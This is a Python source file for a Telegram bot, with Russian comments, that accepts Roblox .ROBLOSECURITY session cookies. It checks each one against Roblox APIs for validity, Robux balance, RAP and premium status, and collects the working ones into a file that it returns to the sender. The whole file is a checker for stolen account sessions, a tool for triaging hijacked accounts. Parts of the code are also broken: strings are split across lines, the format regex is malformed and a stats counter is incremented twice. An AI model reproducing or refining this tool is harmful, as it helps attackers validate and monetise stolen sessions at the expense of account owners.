import asyncio
import aiofiles
import requests
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
import json
import re
from datetime import datetime

API_TOKEN = 'YOUR_BOT_TOKEN'
bot = Bot(token=API_TOKEN)
dp = Dispatcher()

valid_cookies = []
total_stats = {'checked': 0, 'valid': 0, 'total_robux': 0}

async def check_roblox_cookie(cookie: str):
    """Улучшенная проверка Roblox куки"""
    headers = {
        'Cookie': f'.ROBLOSECURITY={cookie}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        # 1. Проверка валидности + базовая инфа
        user_resp = requests.get('https://users.roblox.com/v1/users/authenticated', 
                               headers=headers, timeout=10)
        if user_resp.status_code != 200:
            return None
            
        user_data = user_resp.json()
        user_id = user_data['id']
        username = user_data['name']
        is_premium = user_data.get('isPremium', False)
        
        # 2. Робуксы и донат
        wallet_resp = requests.get('https://economy.roblox.com/v1/wallet', 
                                 headers=headers, timeout=10)
        wallet_data = wallet_resp.json()
        robux = wallet_data.get('robux', 0)
        total_donated = wallet_data.get('totalDonated', 0)  # Общий задоначенный робукс
        
        # 3. RAP (Recent Average Price)
        rap_resp = requests.get(
            f'https://inventory.roblox.com/v2/users/{user_id}/inventory/RecentAveragePrice/last-updated',
            headers=headers, timeout=10
        )
        rap = rap_resp.json().get('recentAveragePrice', 0) if rap_resp.status_code == 200 else 0
        
        return {
            'cookie': cookie,
            'username': username,
            'user_id': user_id,
            'robux': robux,
            'total_donated': total_donated,
            'rap': rap,
            'premium': is_premium,
            'checked_at': datetime.now().isoformat()
        }
        
    except Exception:
        return None

async def save_valid_cookies():
    """Сохранение валидных куки в файл"""
    if not valid_cookies:
        return None
        
    filename = f'valid_roblox_cookies_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=== ВАЛИДНЫЕ ROBLOX КУКИ ===

")
        
        for data in valid_cookies:
            await f.write(f"👤 {data['username']} (ID: {data['user_id']})
")
            await f.write(f"💰 Робуксы: {data['robux']}
")
            await f.write(f"💎 RAP: {data['rap']}
")
            await f.write(f"⭐ Премиум: {'Да' if data['premium'] else 'Нет'}
")
            await f.write(f"📈 Общий донат: {data['total_donated']}
")
            await f.write(f"🍪 Куки: {data['cookie']}
")
            await f.write("-" * 50 + "

")
    
    return filename

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    await message.answer(
        "🔍 Отправьте Roblox куки (.ROBLOSECURITY) для проверки!

"
        "📊 Бот покажет:
"
        "• Валидность куки
"
        "• Количество робуксов
"
        "• RAP (Recent Average Price)
"
        "• Статус премиум
"
        "• Общий задоначенный робукс

"
        "✅ Валидные куки сохраняются в файл"
    )

@dp.message(F.text)
async def check_cookie_handler(message: types.Message):
    cookie = message.text.strip()
    
    # Проверка формата куки
    if not re.match(r'^_ |WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|', cookie):
        await message.answer("❌ Неверный формат Roblox куки!")
        return
    
    await message.answer("⏳ Проверяю куки...")
    
    result = await check_roblox_cookie(cookie)
    total_stats['checked'] += 1
    
    if result:
        valid_cookies.append(result)
        total_stats['valid'] += 1
        total_stats['total_robux'] += result['robux']
        
        stats_text = (
            f"✅ **ВАЛИДНАЯ КУКИ**

"
            f"👤 **{result['username']}** (ID: `{result['user_id']}`)
"
            f"💰 **Робуксы:** {result['robux']:,}
"
            f"📈 **Общий донат:** {result['total_donated']:,}
"
            f"💎 **RAP:** {result['rap']:,}
"
            f"⭐ **Премиум:** {'✅ Да' if result['premium'] else '❌ Нет'}

"
            f"📊 **Статистика:**
"
            f"Проверено: {total_stats['checked']}
"
            f"Валидно: {total_stats['valid']}
"
            f"Всего робуксов: {total_stats['total_robux']:,}"
        )
        
        await message.answer(stats_text, parse_mode="Markdown")
        
        # Сохраняем и отправляем файл каждые 5 валидных куки
        if len(valid_cookies) % 5 == 0:
            filename = await save_valid_cookies()
            if filename:
                await message.answer_document(FSInputFile(filename))
    else:
        total_stats['checked'] += 1
        await message.answer(
            f"❌ **НЕВАЛИДНАЯ КУКИ**

"
            f"📊 Проверено: {total_stats['checked']}
"
            f"✅ Валидно: {total_stats['valid']}"
        )

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
